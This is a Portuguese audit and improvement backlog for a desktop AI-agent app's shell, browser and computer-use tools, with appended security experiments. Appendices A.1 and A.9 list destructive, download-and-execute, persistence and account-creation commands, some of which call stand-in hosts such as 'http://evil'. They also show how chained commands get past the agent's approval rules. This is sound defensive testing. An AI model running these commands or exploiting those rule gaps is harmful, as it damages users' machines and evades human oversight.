| P0-6 | **Exclusão mútua do desktop e dono dos processos entre agentes** (BUG-05): `DesktopLease` (mutex com dono, fila, timeout e `AbortSignal`) dentro de `ComputerLayer`, adquirido por todas as ferramentas `computer_*` que tocam mouse/teclado/foco; `configure()` por chamada deixa de reiniciar o backend; registro de processos compartilhado por `rootSessionId` (com `ownerAgentId`) e encerramento dos processos de filhos no fim do turno raiz, ou promoção explícita | `src/core/computer/layer.ts`, `src/core/tools/computer.ts`, `src/core/tools/shell.ts`, `src/core/agents/runtime.ts:348-426`, `src/main/orchestrator.ts:620-639` | Teste com dois agentes simulados chamando `computer_click` em paralelo: as chamadas ao backend são serializadas; `list_processes` do pai lista os do filho; ao fechar o turno raiz nenhum processo de filho sobrevive |

## P1 — necessário para cumprir os prompts

| # | Melhoria | Arquivo(s) | Critério de pronto |
|---|---|---|---|
| P1-1 | **Sessões de terminal para o agente (PTY)**: ferramentas `terminal_create/send_input/read/resize/interrupt/close/list` sobre `TerminalManager` (mesma classe do terminal do usuário), com buffer em anel, `waiting_for_input` por heurística de prompt/inatividade, aprovação por sessão e id interno | `src/main/terminal.ts` (extrair para `src/core/terminal/` sem Electron), `src/core/tools/terminal.ts` (novo), `permissions.ts` | Teste: abre `cmd`/`powershell`, envia `echo X`, lê `X`, `Ctrl+C` interrompe `ping -t`, `close` mata a árvore; UI do usuário vê a mesma sessão |
| P1-2 | **Saída correta e útil**: manter início+fim (anel) em vez de só o início; `StringDecoder`; decodificar OEM (`chcp 65001` no início do `cmd /d /s /c "chcp 65001>nul & …"` ou `TextDecoder('ibm850')`) e `WSL_UTF8=1`/UTF-16 para `wsl.exe`; exit code como inteiro com sinal; ferramenta `terminal_output` com `tail_lines`, `around_match`+contexto, `regex`, `offset/limit` e **leitura não destrutiva** (`filter` não pode avançar o cursor); avisar corte | `src/core/tools/shell.ts:96-118, 224-230, 394-398` | Testes: 1,2 M de caracteres com erro no fim → `tail_lines=20` o devolve; `echo ação` e erro do `cmd` chegam legíveis; `filter` seguido de leitura completa devolve tudo; WSL sem virtualização devolve texto legível |
| P1-3 | **Blocklist e regras de permissão sérias**: tokenizar e normalizar o comando (aliases PowerShell, `-enc/-e`, `rmdir/rd/del/Remove-Item` + alvo crítico, `Invoke-Expression`, download+execução, `vssadmin`, `cipher /w`, `schtasks/reg add Run`, `Set-ExecutionPolicy`); tratar operadores de shell em `matchCommand` (dividir em `&&`, `\|\|`, `&`, `\|`, `;`, `$()`, crases e exigir regra para **cada** parte); `ruleForApproval` escapa `*` e nunca grava curinga; remover falsos positivos (`echo shutdown`, `git commit -m "…reboot…"`) casando só na posição de comando | `src/core/security/policy.ts:93-133`, `src/core/security/rules.ts:103-113, 193-197`, `tests/security.test.ts` | Tabela de A.1 como teste: 26 comandos arriscados → bloqueados/ask; 7 benignos → liberados; `Bash(npm test:*)` não casa `npm test && curl x \| sh`; aprovar `rm -rf build/*.tmp` não casa `rm -rf build/../src/x.tmp` |
| P1-4 | **Navegador: completar o contrato do M05** — `go_back/go_forward/reload`, `wait_for_url/load_state/text`, `select_option/check/uncheck/hover/double_click/scroll/focus/submit_form`, `find_elements/inspect_dom/get_attribute/get_element_info`, `download` (`context.on('download')` + diretório validado + `list/get_status`), `upload` (`setInputFiles` com `WorkspaceGuard`), iframes (percorrer `page.frames()` no snapshot e aceitar `frame`), refs estáveis no snapshot (`ariaSnapshot({mode:'ai'})`/`aria-ref`), detecção de ambiguidade (`count()>1` → devolver candidatos e exigir `nth`/refinamento antes de ações destrutivas), `context.on('page')` para popups, handler de `dialog` com registro e política, `browser.on('disconnected')`, sessões (`create/list/close`), perfil persistente por workspace (`launchPersistentContext`/`storageState`), configuração (caminho, headless, timeouts, proxy, limite de abas) | `src/core/browser/layer.ts`, `src/core/tools/browser.ts`, `src/shared/types.ts` (AppSettings.browser), `SettingsDialog.tsx` | Suíte E2E nova (item P2-1) cobrindo cada ferramenta contra a página local; cada ferramenta com schema, erro tipado e timeout |
| P1-5 | **Captura de tela de verdade** (BUG-15): `computer_screenshot` com `monitor`, `region` e `zoom`; script de captura DPI-aware (`SetProcessDpiAwarenessContext(PER_MONITOR_AWARE_V2)` antes de ler bounds) ou helper nativo; `capturedAt` e hash no retorno; timeout no `spawn`; limpeza/TTL da pasta `openclod-shots` (ex.: manter 20); `lastCapture` por origem (agente x UI) e com validade; hit-test sem recompilar C# (processo residente ou `Add-Type` em cache) | `src/core/computer/layer.ts:777-835`, `src/core/tools/computer.ts:17-60, 338-386`, `src/main/orchestrator.ts:1697` | Teste do conversor com escala 125/150/200% e monitores com origem negativa; teste de que `openclod-shots` nunca passa de N arquivos; medição do hit-test < 300 ms |
| P1-6 | **Segredos**: redigir `args` de `browser_type/computer_type_text/computer_set_value` nos eventos/Atividade (guardar só comprimento/hash) e em `describe()`; aplicar `redactSecrets` + padrões de URL com token a **toda** saída de ferramenta; ampliar `sanitizedEnv` (lista + heurística de valor) e permitir `env` explícito por comando; remover query string de `networkErrors`; rotação/teto de `events.jsonl` | `activity-store.ts:35`, `session/store.ts:214`, `tools/browser.ts:128`, `tools/computer.ts:684`, `runner.ts:851-868`, `security/policy.ts:171-196`, `core/browser/layer.ts:211-219` | Teste: digitar `S3nh@` não aparece em `events.jsonl`/`activity.json`/transcript; saída com `sk-…`/`Bearer …`/`?token=` chega mascarada |
| P1-7 | **Ponte do Chrome**: `expiresAt` por comando e remoção da fila ao estourar o timeout; ids de perfil/janela e roteamento por perfil; captura de console/rede via `chrome.debugger` ou content script; não usar `taskkill /IM` global (usar PID do host registrado); mensagem clara quando a extensão estiver conectada porém sem permissão de `file:` | `src/main/chrome/bridge.ts:122-132, 216-229, 314-320`, `resources/bin/chrome-host/main.go` | Teste de unidade da ponte (sem `start()`): comando expirado não é entregue; `consoleEntries` devolve eventos simulados; E2E com extensão carregada documentado em `Prints/` |
| P1-8 | **Kill switch**: atalho global (ex.: `Ctrl+Alt+Esc`/`Pause`) que aborta o turno, solta mouse/teclado, mata processos e fecha o overlay; botão "Parar" visível no overlay (mascote clicável) | `src/main/index.ts` (globalShortcut), `src/main/computer-overlay.ts` | Teste manual registrado + teste unitário do handler; o atalho funciona com a janela principal coberta |
| P1-9 | **Configuração do terminal**: shell padrão, caminho dos executáveis, limites de saída, máx. de processos/sessões, política de encerramento, `env` por comando, escolha de shell por chamada (`shell: 'cmd'\|'powershell'\|'bash'\|'wsl'`) com adaptador por shell (quoting, encerramento) | `src/core/tools/shell.ts`, novo `src/core/terminal/adapters.ts`, `settings.ts`, `SettingsDialog.tsx` | Testes por adaptador (args, quoting, `chcp`, encerramento); `list_processes` aplica o limite configurado e avisa duplicados do mesmo comando/cwd |
| P1-10 | **Computer Use: resolução de alvos e verificação**: `computer_find_text` (OCR do `captureScreen` já com mapa imagem→tela, reutilizando `ocrImage`), `find_ui_element` (papel/nome sobre a árvore normalizada em JSON), `get_active_window`, `compare_screen_state` (hash/diff com `sharp`), `verify_action` explícito, TTL para coordenadas de captura | `src/core/computer/*`, `src/core/tools/computer.ts`, `src/core/media/ocr.ts` | Testes com árvore/captura sintéticas e OCR real (já existe `scripts/ocr-live.ts`); `find_text` devolve coordenada que `computer_click` aceita |

## P2 — cobertura, UX e documentação

| # | Melhoria | Arquivo(s) | Critério de pronto |
|---|---|---|---|
| P2-1 | **Infra de teste real**: app web local de teste (links, forms obrigatórios, select/checkbox/radio, tabela com paginação, iframe, shadow DOM, modal, download, `target=_blank`, página 500/redirect) em `tests/fixtures/web/` + `tests/browser-e2e.test.ts` (Playwright headless); app WinForms/PowerShell de teste (botões, campos, checkbox, menu, diálogo) para o `scripts/computer-use-live.ts`; testes de processos (timeout, cancel, órfãos, buffer, stdin, encoding) em `tests/shell-process.test.ts` | `tests/`, `scripts/` | Os cenários A-G do M05, A-D do M04 e §15.2-15.4 do M06 viram testes que passam em `npx vitest run` |
| P2-2 | **Limites de memória/recursos**: evicção LRU em `snapshotRefs/snapshotFrames` (ex.: 20 snapshots/alvo); teto de `networkErrors`; teto do `events.jsonl`; teto de navegadores simultâneos por turno | `core/computer/layer.ts:184-186, 417-420`, `core/browser/layer.ts:92`, `agents/runtime.ts` | Teste de 1 000 snapshots mantém < N entradas |
| P2-3 | **Cancelamento ponta a ponta**: propagar `AbortSignal` a `ComputerLayer.call/run`, ao Playwright (`page.goto({signal})` / fechar página) e à extensão (`cancel` por id) | `core/computer/layer.ts`, `core/browser/layer.ts`, `bridge.ts` | Teste: `abort` durante `drag` simulado devolve em < 1 s |
| P2-4 | **Eventos e hooks nomeados**: emitir `computer.*`, `browser.*`, `terminal.*`, `process.*` pelo dispatcher existente e aceitar esses nomes em `HookEvent` | `shared/types.ts:340-350`, `core/hooks/runner.ts`, `runner.ts` | Hook de usuário em `process.exited` dispara com PID/exit code |
| P2-5 | **Skills e comandos**: skills `browser-research`, `web-testing`, `dev-server`, `run-tests`; comandos `/browse /research-web /test-web /inspect-page /check-links /run /test /build /dev-server /logs /stop-process` | `resources/skills/*`, registro de comandos | Cada comando aparece no menu `/` e executa o fluxo com as ferramentas centrais |
| P2-6 | **UI**: painel "Computer Use" (janela controlada, último screenshot, histórico de ações com verificação, botão parar), rótulos faltantes em `format.ts`, indicação clara de que o preview (`BrowserPane`) não é o navegador do agente, histórico/pesquisa no terminal, tratamento de Ctrl+Shift+C/V | `renderer/src/components/*`, `lib/format.ts:67-88` | Capturas em `Prints/` e `scripts/ui-*.cjs` atualizados |
| P2-7 | **Documentação e proveniência**: atualizar README (contagens, backend embutido, modo Chrome com ressalvas), `ARCHITECTURE.md` §10, `CODE_REUSE_MATRIX.md` (status real), e clonar os repositórios que faltam (pywinauto, FlaUI, OpenCV, Tesseract, python-mss, AutoHotkey, playwright-mcp, selenium, BrowserGym, devtools-protocol, node, node-pty, Windows Terminal, PowerShell, OpenSSH, wezterm, ShellCheck) ou registrar a decisão de não usar | `README.md`, `docs/ARCHITECTURE.md`, `docs/research/*`, `scripts/clone-research-repos.ps1` | `CLONE_STATUS.json` com 100% dos repositórios pedidos, ou nota "dispensado: motivo" por item |

---

# Apêndice A — Experimentos executados (reproduzíveis)

Todos rodaram **fora** do projeto (arquivos temporários em `…\scratchpad\m456\`, que some com a sessão), sem editar o repositório, sem Electron, sem clicar/digitar na tela e sem capturar o desktop. Receita comum para executar o código do projeto:

```powershell
# empacota módulos TypeScript do projeto num .cjs (somente leitura do projeto)
node node_modules/esbuild/bin/esbuild <entry.ts> --bundle --platform=node --format=cjs --outfile=<saida>.cjs
# entry.ts exporta, por exemplo:
#   export * from 'C:/…/src/core/tools/shell.ts'
#   export { checkCommand } from 'C:/…/src/core/security/policy.ts'
# para BrowserLayer: acrescentar --external:playwright --external:playwright-core e rodar com NODE_PATH=<repo>\node_modules
```

Ambiente: Windows 10 Pro 19045, Node 22.22.1, PowerShell 5.1.19041, 2 monitores (`VirtualScreen` 3840x1082, `LogPixels=96`), Google Chrome instalado, `wsl.exe` com distro Ubuntu (virtualização desativada), Git Bash presente, `ssh` e `pwsh` ausentes.

## A.1 Lista de comandos perigosos (`checkCommand`, `policy.ts`) — `e1.cjs`

Saída real (modo `auto`, sem regras do usuário):

```
BLOQ   rm -rf /                              (remoção recursiva da raiz)
BLOQ   rm -rf ~
PASSA  Remove-Item -Recurse -Force C:\
PASSA  Remove-Item -Recurse -Force $HOME
PASSA  rmdir /s /q C:\Users\Public
BLOQ   rd /s /q C:\
PASSA  del /f /s /q C:\Windows\*
PASSA  powershell -enc SQBFAFgA
PASSA  powershell -e SQBFAFgA
BLOQ   powershell -EncodedCommand SQBFAFgA
BLOQ   iex (iwr http://x/a.ps1)
BLOQ   IEX(New-Object Net.WebClient).DownloadString("http://x")
PASSA  Invoke-Expression (iwr http://x)
PASSA  curl http://x/a.sh -o a.sh && bash a.sh
BLOQ   curl -s http://x | sh
PASSA  Stop-Process -Name explorer -Force
PASSA  taskkill /F /IM explorer.exe
PASSA  git push --force origin main
PASSA  git reset --hard HEAD~50
PASSA  git clean -fdx
PASSA  vssadmin delete shadows /all /quiet
PASSA  schtasks /create /tn x /tr calc.exe /sc minute
PASSA  reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v x /d calc.exe
PASSA  Set-ExecutionPolicy Unrestricted
BLOQ   net user hacker P@ss /add
PASSA  cipher /w:C:
BLOQ   git commit -m "fix reboot bug"        (falso positivo: desligamento/reinício)
BLOQ   echo shutdown                         (falso positivo)
BLOQ   npm run reboot-server                 (falso positivo)
BLOQ   grep -rn "format c:" docs             (falso positivo)
BLOQ   rm -rf *.tmp                          (falso positivo: "raiz")
PASSA  rm -rf ./dist
PASSA  rm -rf node_modules
```

## A.2 Permissões por modo para ferramentas do navegador — `e2.cjs`

`evaluateTool` + `describe()` reais, política sem regras (extrato):

```
== modo ask
browser_open  file:// ssh        -> deny  ("…está em ~/.ssh, um local de credenciais…")
browser_navigate file:// ssh     -> deny
browser_new_tab file:// ssh      -> allow - leitura de rede
browser_navigate metadata AWS    -> allow - leitura de rede
browser_navigate localhost:8080  -> allow - leitura de rede
browser_claim_tab active         -> allow - leitura de rede
browser_close_tab                -> allow - leitura de rede
browser_click                    -> ask
== modo auto            (new_tab, metadata, localhost, claim_tab, close_tab, click -> allow)
== modo unrestricted    (tudo allow, inclusive browser_open file:// ssh)

zod aceita em browser_open: file:///C:/Windows/win.ini · javascript:alert(1) · chrome://settings
                            data:text/html,<script>1</script> · view-source:file:///C:/x
ferramentas browser_(close|claim|new)* presentes nos AgentModes: ask, plan, review, web, code
```

## A.3 Execução de comandos (`runShellCommand`) — `e3.cjs`

```
[start /b + timeout 1s]                          7.2s  { code: 0, timedOut: true }
[stdin aberto (node espera EOF) timeout 3s]      3.3s  { code: 1, timedOut: true, stdout: '' }
[saida grande: erro no final]                    0.3s  { code: 3, stdoutLen: 600530, stderrHas: true, stdoutHasLastLine: false }
[saida grande: ultima linha no stdout]           0.3s  { stdoutLen: 600114, hasTail: false }
[abort em ping 30s]                              0.9s  { code: 1, timedOut: false }     # sem ping residual (tasklist)
```

## A.4 Processos em segundo plano — `e4.cjs`

```
pid 28692 ok true
leitura 1 com filter=LINHA_B  -> "LINHA_B ok"
leitura 2 sem filtro          -> "(sem saída nova)"        # LINHA_A e LINHA_C foram consumidas
tail retido pela UI           -> "LINHA_A erro\nLINHA_B ok\nLINHA_C erro\n"
stop_process                  -> "sinal de encerramento enviado ao PID 28692" (14ms)
apos stop                     -> "encerrou (exit 1)"
6 processos iguais em segundo plano, sem limite nem aviso de duplicidade: 8744,14860,20684,28056,16892,3936
```

Também: `runShellCommand(..., cwd:'C:/nao/existe/mesmo')` → `code:-1, stderr:"spawn C:\Windows\system32\cmd.exe ENOENT"`; `comando_que_nao_existe_xyz` → `n�o � reconhecido como um comando interno`.

## A.5 Playwright headless contra página local — `e5.cjs`

Servidor HTTP em 127.0.0.1 (porta efêmera) com: 2 botões "Excluir", input, `<select>`, checkbox, link `target=_blank`, link de download, botão com `alert()`, botão que cria elemento após 800 ms, `<iframe>` com botão, botão em shadow root. `BrowserLayer({mode:'playwright'})` + ferramentas reais:

```
open (ms)                                      2744
snapshot contem iframe?                        false      (aparece só "- iframe")
snapshot contem shadow?                        true
clique ambiguo (2 botoes Excluir) ok?          true
qual foi clicado?                              excluiu A
browser_type em <select>                       ERRO: locator.fill: Element is not an <input>, <textarea> or [contenteditable] element
browser_type em checkbox                       ERRO: locator.fill: Input of type "checkbox" cannot be filled
clique em botao dentro de iframe               ERRO: locator.click: Timeout 15000ms exceeded.
clique em botao no shadow DOM                  ok
abas antes/depois do target=_blank             [1,1]
apos alert(): #log =                           alert fechado       (diálogo descartado, modelo não é avisado)
wait por elemento dinamico                     ok
download: ha ferramenta para status/lista?     []
networkErrors apos 600 respostas 500           600
erro contem querystring com token?             HTTP 500 http://127.0.0.1:52252/err?i=599&token=SEGREDO599
browser_new_tab file:///C:/Windows/win.ini     ABRIU
browser_read dessa aba                         "; for 16-bit app support [fonts] [extensions] [mci extension"
navigate http://169.254.169.254/               Timeout 15000ms (sem bloqueio de política)
```

## A.6 Código da extensão executado em Chromium headless — `e6.cjs`

O script lê `resources/chrome-extension/background.js`, extrai o corpo das funções injetadas de `click` e `type` e as executa numa página local com `<button>Excluir tudo</button>`, `<button>Salvar</button>` e um `<form>` com `<input aria-label="Busca">`:

```
click {role:button,name:"Salvar"}      -> elementos que receberam click: [ 'HTML#' ]   | #log: "nada"
click {text:"Excluir tudo"}            -> elementos clicados: [ 'HTML#' ]              | #log: "nada"
type submit=true (name:"Busca")        -> campo = "abc" | #log: "nada"  (formulário não enviado)
press Enter (KeyboardEvent sintético)  -> #log: "nada"
```

## A.7 Ponte do Chrome (sem iniciar o servidor) — `e7.cjs`

(`start()` foi evitado de propósito: ele executa `taskkill /IM openclod-chrome-host.exe /F`.)

```
isAttached antes do hello: false   | apos hello: true
apos 605ms a ferramenta recebeu erro: "o Chrome não respondeu à ação click em 1s"
comandos ainda na fila apos o timeout: 1 ["click"]
entregues quando a extensão volta a consultar: [{"type":"click","target":{"name":"Excluir conta"}}]
consoleEntries/errors no modo Chrome existente: [] []
```

## A.8 Codificação da saída — `enc.cjs`, `e8.cjs`, `e12.cjs`

```
spawn('echo ação útil & chcp', {shell:true})  bytes: 61 87 c6 6f 20 a3 74 69 6c …  "Página de código ativa: 850"
  como utf8   : "a��o �til \r\nP�gina de c�digo ativa: 850"
  como latin1 : "aÆo £til …"            (CP850 real)
WSL (Ubuntu, virtualização desativada): code 4294967295, stdout "O\u0000 \u0000W\u0000S\u0000L\u00002\u0000 …"  (UTF-16LE lido como UTF-8)
```

## A.9 Regras "permitir sempre" — `e9.cjs`

```
regra gravada ao escolher "permitir sempre": Bash(rm -rf build/*.tmp)
true   rm -rf build/*.tmp
true   rm -rf build/../src/keep.tmp
true   rm -rf build/x ; rm -rf ~/docs/*.tmp
true   rm -rf build/a && curl http://evil | sh #.tmp
Bash(npm test)        : true  npm test | false npm test && del … | false npm test; calc
Bash(npm test:*)      : true  npm test --silent | true npm test && curl evil | sh | true npm test & calc | false npm test; calc
```

## A.10 Ambiente SSH/Nuvem — `e10.cjs`

```
linha enviada ao cmd.exe local:
  echo [PREFIXO-REMOTO] 'cd '\''/srv/app'\'' && echo PARTE1 && echo PARTE2_EXECUTADA_LOCALMENTE'
saida real:
[PREFIXO-REMOTO] 'cd '\''/srv/app'\'' 
PARTE1 
PARTE2_EXECUTADA_LOCALMENTE'
```

## A.11 Medições diversas

| Medição | Resultado |
|---|---|
| `computer_window_at` (hit-test; ponto (10,10) em coordenadas de tela, somente leitura) | 1946 ms, 1710 ms, 1635 ms |
| `powershell.exe` (5.1) `GetAwarenessFromDpiAwarenessContext` | 0 (DPI-unaware) |
| `GetSystemMetrics(SM_CXVIRTUALSCREEN)` | 3840 (2 telas); `LogPixels` 96 |
| `%TEMP%\openclod-shots` | 45 arquivos, 13 MB |
| `grep -ri dpi src` | 0 ocorrências |
| `interactive_only` sobre 4 linhas reais da matriz | 4 de 4 mantidas (filtro inoperante) |

---

# Apêndice B — Repositórios pedidos x clonados (`repositorios/_research`)

| Módulo | Pedidos | Clonados | Ausentes |
|---|---:|---:|---|
| 04 | 14 | 8 | pywinauto, FlaUI, OpenCV, Tesseract, python-mss, AutoHotkey |
| 05 | 9 | 5 | playwright-mcp, selenium, BrowserGym, devtools-protocol |
| 06 | 10 | 3 (+ terax-ai) | node, node-pty (usa pacote npm `@lydell/node-pty`), Windows Terminal, PowerShell, OpenSSH, wezterm/portable-pty, ShellCheck |

Fonte: `ls repositorios/_research/*` e `docs/research/REPOSITORY_INVENTORY_2026-10-25.md`. O `CODE_REUSE_MATRIX.md` mostra a fatia 1 (settle, do munim-computer-use) como a única "feita".

# Apêndice C — Inventário de ferramentas reais

- **computer_* (22):** list_apps, list_windows, window_at, get_window, cursor_position, snapshot, screenshot, click, mouse_move, mouse_button, set_value, type_text, press_key, scroll, drag, open_path, launch, activate, secondary_action, wait, wait_for, wait_for_window (`tools/computer.ts:1146-1169`).
- **browser_* (15):** open, navigate, snapshot, click, type, press, read, screenshot, console, wait, tabs, new_tab, claim_tab, switch_tab, close_tab (`tools/browser.ts:396-412`).
- **Shell (6):** run_command, start_process, read_process_output, list_processes, stop_process, list_ports (`tools/shell.ts:478-485`).
- **Relacionadas:** `image_ocr` (`tools/images.ts:100`, Windows.Media.Ocr via PowerShell, `media/ocr.ts`), `fetch_url/web_search/web_research/download_file` (`tools/web.ts`).
- **Terminal do usuário (IPC, não são ferramentas do agente):** `terminal:create/list/shells/snapshot/kill/write/resize` (`index.ts:2159-2194`).
